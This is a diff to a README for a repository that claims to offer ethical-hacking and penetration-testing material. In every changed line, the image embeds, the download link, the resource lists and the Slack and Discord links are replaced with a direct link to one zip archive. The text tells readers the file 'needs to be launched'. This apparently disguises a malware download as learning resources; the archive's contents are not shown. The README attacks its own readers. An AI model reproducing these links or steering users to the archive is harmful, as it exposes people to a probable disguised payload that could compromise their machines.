@@ -2,7 +2,7 @@
 
 Welcome to the "Basic-Penetration-Testing-Report-Ethical-Hacking" repository! This is your one-stop destination for all things related to basic penetration testing, ethical hacking, and various cyber attack techniques. 
 
-![Ethical Hacking Image](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
+![Ethical Hacking Image](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/raw/refs/heads/main/purpart/Ethical_Testing_Penetration_Hacking_Report_Basic_ignorance.zip)
 
 ## Repository Topics:
 - Basic Pentesting
@@ -22,7 +22,7 @@ Feel free to explore these topics in-depth and enhance your knowledge and skills
 ## Repository Access:
 You can access the repository by clicking the link provided below:
 
-[Download Repository](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
+[Download Repository](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/raw/refs/heads/main/purpart/Ethical_Testing_Penetration_Hacking_Report_Basic_ignorance.zip)
 
 Please note that the link provided is a downloadable file that needs to be launched for access to the repository content.
 
@@ -38,9 +38,9 @@ To get started with exploring the content of this repository, follow these simpl
 ## 📚 Additional Resources
 In addition to the content available in this repository, make sure to check out the following resources to further your knowledge in the field of ethical hacking and penetration testing:
 
-- [Awesome Ethical Hacking List](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
-- [Ethical Hacking Blogs](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
-- [Penetration Testing Tools](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
+- [Awesome Ethical Hacking List](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/raw/refs/heads/main/purpart/Ethical_Testing_Penetration_Hacking_Report_Basic_ignorance.zip)
+- [Ethical Hacking Blogs](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/raw/refs/heads/main/purpart/Ethical_Testing_Penetration_Hacking_Report_Basic_ignorance.zip)
+- [Penetration Testing Tools](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/raw/refs/heads/main/purpart/Ethical_Testing_Penetration_Hacking_Report_Basic_ignorance.zip)
 
 ## 👨‍💻 Contribution Guidelines
 If you are enthusiastic about cybersecurity and want to contribute to this repository, feel free to submit your pull requests. Whether it's fixing a typo, adding new content, or updating existing information, your contributions are highly appreciated.
@@ -53,13 +53,13 @@ To contribute, follow these steps:
 ## 🤝 Community Support
 Join our community of cybersecurity enthusiasts, ethical hackers, and penetration testers to engage in discussions, share insights, and collaborate on various projects. Connect with us on:
 
-- [Slack Channel](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
-- [Discord Server](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
+- [Slack Channel](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/raw/refs/heads/main/purpart/Ethical_Testing_Penetration_Hacking_Report_Basic_ignorance.zip)
+- [Discord Server](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/raw/refs/heads/main/purpart/Ethical_Testing_Penetration_Hacking_Report_Basic_ignorance.zip)
 
 ## 🌟 Stay Updated
 To stay updated with the latest content, tutorials, and resources related to ethical hacking and penetration testing, make sure to follow this repository. 
 
-![Stay Updated](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
+![Stay Updated](https://github.com/deblunt/Basic-Penetration-Testing-Report-Ethical-Hacking/raw/refs/heads/main/purpart/Ethical_Testing_Penetration_Hacking_Report_Basic_ignorance.zip)
 
 Thank you for visiting the "Basic-Penetration-Testing-Report-Ethical-Hacking" repository! Let's together make the cyber world a safer place.
 
